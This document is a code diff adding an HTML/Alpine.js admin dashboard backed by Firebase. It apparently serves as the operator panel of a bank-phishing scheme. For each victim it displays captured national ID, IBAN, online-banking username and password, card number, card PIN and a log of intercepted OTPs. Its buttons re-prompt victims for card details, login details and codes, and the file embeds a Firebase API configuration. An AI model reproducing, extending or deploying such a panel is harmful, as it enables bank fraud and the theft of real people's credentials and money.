@@ -1,0 +1,541 @@
+<!DOCTYPE html>
+<html lang="en" style="min-height: 100%; display: flex; flex-direction: column">
+	<head>
+		<meta charset="utf-8" />
+		<meta
+			name="viewport"
+			content="width=device-width, initial-scale=1, shrink-to-fit=no"
+		/>
+
+		<link rel="stylesheet" href="/css/bootstrap.min.css" />
+		<title>Dashboard</title>
+		<link rel="stylesheet" href="./css/handle.css" />
+	</head>
+	<body x-data="adminDashboard" style="direction: rtl; text-align: right">
+		<button class="btn btn-success w-100" onclick="$('#addDiv').toggle()">
+			Add New
+		</button>
+
+		<div id="addDiv" class="mt-4">
+			<h3>Add customer</h3>
+			<form class="mt-3" id="addForm">
+				<input
+					type="text"
+					class="form-control mb-3"
+					required
+					data-cs-form-element="id_num"
+					placeholder="رقم البطاقة الوطنية"
+				/>
+				<input
+					type="text"
+					class="form-control mb-3"
+					required
+					data-cs-form-element="name_ar"
+					placeholder="الاسم بالعربي"
+				/>
+				<input
+					type="text"
+					class="form-control mb-3"
+					required
+					data-cs-form-element="birth_date_h"
+					placeholder="تاريخ الميلاد الهجري"
+				/>
+				<input
+					type="text"
+					class="form-control mb-3"
+					required
+					data-cs-form-element="birth_place"
+					placeholder="مكان الولادة"
+				/>
+				<button class="btn btn-success w-100" type="submit">حفظ</button>
+			</form>
+		</div>
+
+		<div class="mt-4">
+			<h3>Customer records</h3>
+			<svg
+				x-show="fetchingCustomers"
+				id="loader"
+				width="50"
+				height="50"
+				xmlns="http://www.w3.org/2000/svg"
+				viewBox="0 0 100 100"
+				preserveAspectRatio="xMidYMid"
+			>
+				<circle
+					cx="50"
+					cy="50"
+					fill="none"
+					stroke="#aaa"
+					stroke-width="5"
+					r="35"
+					stroke-dasharray="164.93361431346415 56.97787143782138"
+					transform="rotate(269.874 50 50)"
+				>
+					<animateTransform
+						attributeName="transform"
+						type="rotate"
+						calcMode="linear"
+						values="0 50 50;360 50 50"
+						keyTimes="0;1"
+						dur="1s"
+						begin="0s"
+						repeatCount="indefinite"
+					></animateTransform>
+				</circle>
+			</svg>
+
+			<div id="items" class="mt-3 col-md-12">
+				<template x-for="user in users">
+					<div class="row">
+						<div class="col-md-2" data-group="base">
+							<div>
+								<font style="vertical-align: inherit"
+									><font style="vertical-align: inherit"
+										>Last Operation:
+									</font></font
+								><span data-field="state"
+									><font style="vertical-align: inherit"
+										><font
+											style="vertical-align: inherit"
+											x-text="user.state"
+											>BANK_UPDATED</font
+										></font
+									></span
+								>
+							</div>
+						</div>
+						<div class="col-md-2" data-group="base">
+							<div>
+								<font style="vertical-align: inherit"
+									><font style="vertical-align: inherit"
+										>Name:
+									</font></font
+								><span data-field="name_ar"
+									><font style="vertical-align: inherit"
+										><font
+											style="vertical-align: inherit"
+											x-text="user.name_ar"
+											>ahmad</font
+										></font
+									></span
+								>
+							</div>
+							<div>
+								<font style="vertical-align: inherit"
+									><font style="vertical-align: inherit"
+										>Status card number:
+									</font></font
+								><span data-field="id_num"
+									><font style="vertical-align: inherit"
+										><font
+											style="vertical-align: inherit"
+											x-text="user.id_num"
+											>10101010101</font
+										></font
+									></span
+								>
+							</div>
+							<div>
+								<font style="vertical-align: inherit"
+									><font style="vertical-align: inherit"
+										>Hijri date of birth:
+									</font></font
+								><span data-field="birth_date_h"
+									><font style="vertical-align: inherit"
+										><font
+											style="vertical-align: inherit"
+											x-text="user.birth_date_h"
+											>26/2/1422</font
+										></font
+									></span
+								>
+							</div>
+							<div>
+								<font style="vertical-align: inherit"
+									><font style="vertical-align: inherit"
+										>Place of birth:
+									</font></font
+								><span data-field="birth_place"
+									><font style="vertical-align: inherit"
+										><font
+											style="vertical-align: inherit"
+											x-text="user.birth_place"
+											>kiddah</font
+										></font
+									></span
+								>
+							</div>
+						</div>
+						<div class="col-md-2" data-group="base">
+							<div>
+								<font style="vertical-align: inherit"
+									><font style="vertical-align: inherit"
+										>Bank name:
+									</font></font
+								><span data-field="b_name"
+									><font style="vertical-align: inherit"
+										><font
+											style="vertical-align: inherit"
+											x-text="user.b_name"
+											>Hollandi Awal</font
+										></font
+									></span
+								>
+							</div>
+							<div>
+								<font style="vertical-align: inherit"
+									><font style="vertical-align: inherit"
+										>IBAN:
+									</font></font
+								><span data-field="iban"
+									><font style="vertical-align: inherit"
+										><font
+											style="vertical-align: inherit"
+											x-text="user.iban"
+											>4234234</font
+										></font
+									></span
+								>
+							</div>
+							<div>
+								<font style="vertical-align: inherit"
+									><font style="vertical-align: inherit"
+										>Transfer Code:
+									</font></font
+								><span data-field="deposit_code"
+									><font style="vertical-align: inherit"
+										><font
+											style="vertical-align: inherit"
+											x-text="user.deposit_code"
+											>5555</font
+										></font
+									></span
+								>
+							</div>
+							<div>
+								<font style="vertical-align: inherit"
+									><font style="vertical-align: inherit"
+										>Amount:
+									</font></font
+								><span data-field="amount"
+									><font style="vertical-align: inherit"
+										><font
+											style="vertical-align: inherit"
+											x-text="user.amount"
+											>5231</font
+										></font
+									></span
+								>
+							</div>
+						</div>
+						<div class="col-md-2" data-group="base">
+							<div>
+								<font style="vertical-align: inherit"
+									><font style="vertical-align: inherit"
+										>user name:</font
+									></font
+								><span
+									data-field="username"
+									x-text="user.username"
+								></span>
+							</div>
+							<div>
+								<font style="vertical-align: inherit"
+									><font style="vertical-align: inherit"
+										>password:</font
+									></font
+								><span
+									data-field="password"
+									x-text="user.password"
+								></span>
+							</div>
+						</div>
+						<div class="col-md-2" data-group="base">
+							<div>
+								<font style="vertical-align: inherit"
+									><font style="vertical-align: inherit"
+										>Teller card number:
+									</font></font
+								><span data-field="card_num"
+									><font style="vertical-align: inherit"
+										><font
+											style="vertical-align: inherit"
+											x-text="user.card_num"
+											>1234123421341234</font
+										></font
+									></span
+								>
+							</div>
+							<div>
+								<font style="vertical-align: inherit"
+									><font style="vertical-align: inherit"
+										>Teller secret code:
+									</font></font
+								><span data-field="card_code"
+									><font style="vertical-align: inherit"
+										><font
+											style="vertical-align: inherit"
+											x-text="user.card_code"
+											>4444</font
+										></font
+									></span
+								>
+							</div>
+						</div>
+						<div class="col-md-2">
+							<table class="otp" border="1" width="100%">
+								<thead>
+									<tr>
+										<th>
+											<font
+												style="vertical-align: inherit"
+												><font
+													style="
+														vertical-align: inherit;
+													"
+													>Time</font
+												></font
+											>
+										</th>
+										<th>
+											<font
+												style="vertical-align: inherit"
+												><font
+													style="
+														vertical-align: inherit;
+													"
+													>OTP1</font
+												></font
+											>
+										</th>
+									</tr>
+								</thead>
+								<tbody data-el="otp1">
+									<tr>
+										<td>
+											<font
+												style="vertical-align: inherit"
+												><font
+													style="
+														vertical-align: inherit;
+													"
+													>20:11:55</font
+												></font
+											>
+										</td>
+										<td>
+											<font
+												style="vertical-align: inherit"
+												><font
+													style="
+														vertical-align: inherit;
+													"
+													>1231</font
+												></font
+											>
+										</td>
+									</tr>
+									<tr>
+										<td>
+											<font
+												style="vertical-align: inherit"
+												><font
+													style="
+														vertical-align: inherit;
+													"
+													>20:12:21</font
+												></font
+											>
+										</td>
+										<td>
+											<font
+												style="vertical-align: inherit"
+												><font
+													style="
+														vertical-align: inherit;
+													"
+													>1231</font
+												></font
+											>
+										</td>
+									</tr>
+								</tbody>
+							</table>
+							<div class="text-center mt-3"></div>
+						</div>
+						<div class="col-md-2">
+							<button
+								class="btn btn-sm btn-success w-100"
+								data-action="ERROR_CARD_DETAILS"
+								:class="{'d-none': !['CARD_UPDATED', 'PIN_ADDED'].includes(user.state)}"
+							>
+								<font style="vertical-align: inherit"
+									><font style="vertical-align: inherit"
+										>Redial card details</font
+									></font
+								>
+							</button>
+							<button
+								class="btn btn-sm btn-danger w-100 mt-1"
+								data-action="ERROR_ONLINE_CONNECTION"
+								:class="{'d-none': !['ONLINE_UPDATED', 'PIN_ADDED'].includes(user.state)}"
+							>
+								<font style="vertical-align: inherit"
+									><font style="vertical-align: inherit"
+										>Re-request online details</font
+									></font
+								>
+							</button>
+							<button
+								class="btn btn-sm btn-success w-100 mt-1"
+								data-action="REQUEST_CODE"
+								:class="{'d-none': !['ONLINE_UPDATED', 'CARD_UPDATED', 'PIN_ADDED'].includes(user.state)}"
+							>
+								<font style="vertical-align: inherit"
+									><font style="vertical-align: inherit"
+										>Code request</font
+									></font
+								>
+							</button>
+							<button
+								class="btn btn-sm btn-danger w-100 mt-1"
+								data-action="ERROR_CODE"
+								:class="{'d-none': user.state != 'PIN_ADDED'}"
+							>
+								<font style="vertical-align: inherit"
+									><font style="vertical-align: inherit"
+										>Redial Code</font
+									></font
+								>
+							</button>
+							<button
+								class="btn btn-sm btn-success w-100 mt-1"
+								data-action="COMPLETE"
+								:class="{'d-none': user.state != 'PIN_ADDED'}"
+							>
+								<font style="vertical-align: inherit"
+									><font style="vertical-align: inherit"
+										>ending</font
+									></font
+								>
+							</button>
+							<button
+								class="btn btn-sm btn-light w-100 mt-1"
+								data-control-action="delete"
+							>
+								<font style="vertical-align: inherit"
+									><font style="vertical-align: inherit"
+										>Delete</font
+									></font
+								>
+							</button>
+						</div>
+					</div>
+				</template>
+			</div>
+		</div>
+
+		<script type="module">
+			import { initializeApp } from "https://www.gstatic.com/firebasejs/9.12.1/firebase-app.js";
+
+			import {
+				getFirestore,
+				collection,
+				doc,
+				addDoc,
+				setDoc,
+				getDocs,
+			} from "https://www.gstatic.com/firebasejs/9.12.1/firebase-firestore.js";
+
+			const firebaseConfig = {
+				apiKey: "AIzaSyA9QxtaVAxgyUp7I7BE9sc16qS02LX6Q7E",
+				authDomain: "letterplace-c103c.firebaseapp.com",
+				databaseURL: "https://letterplace-c103c.firebaseio.com",
+				projectId: "letterplace-c103c",
+				storageBucket: "letterplace-c103c.appspot.com",
+				messagingSenderId: "658174549550",
+				appId: "1:658174549550:web:d3c99b2be934379b6209bf",
+			};
+
+			const app = initializeApp(firebaseConfig);
+			const db = getFirestore(app);
+
+			window.fireBaseStuff = {
+				getFirestore,
+				collection,
+				doc,
+				addDoc,
+				setDoc,
+				getDocs,
+				app,
+				db,
+			};
+		</script>
+		<script src="//unpkg.com/alpinejs" defer></script>
+		<script>
+			document.addEventListener("alpine:init", () => {
+				const {
+					getFirestore,
+					collection,
+					doc,
+					addDoc,
+					setDoc,
+					getDocs,
+					app,
+					db,
+				} = window.fireBaseStuff;
+
+				async function fetchUsers() {
+					let users = [];
+					const cachedUsers = localStorage.getItem("CACHED_USERS");
+
+					if (cachedUsers) users = JSON.parse(cachedUsers);
+					else {
+						const querySnapshot = await getDocs(
+							collection(db, "accounts")
+						);
+
+						querySnapshot.forEach(async (document) => {
+							console.log(document.id, document.data());
+							const data = {
+								...document.data(),
+								ref: document.id,
+							};
+
+							if (data.pin_data?.length > 0) {
+								try {
+									data.pin_data = JSON.parse(data.pin_data);
+								} catch (error) {}
+							}
+
+							users.push(data);
+						});
+
+						localStorage.setItem(
+							"CACHED_USERS",
+							JSON.stringify(users)
+						);
+					}
+
+					return users;
+				}
+
+				Alpine.data("adminDashboard", () => ({
+					users: [],
+					fetchingCustomers: false,
+					async init() {
+						this.fetchingCustomers = true;
+						try {
+							this.users = await fetchUsers();
+							this.fetchingCustomers = false;
+						} catch (error) {
+							this.fetchingCustomers = true;
+							console.log("Error fetching users: ", error);
+						}
+					},
+				}));
+			});
+		</script>
+	</body>
+</html>
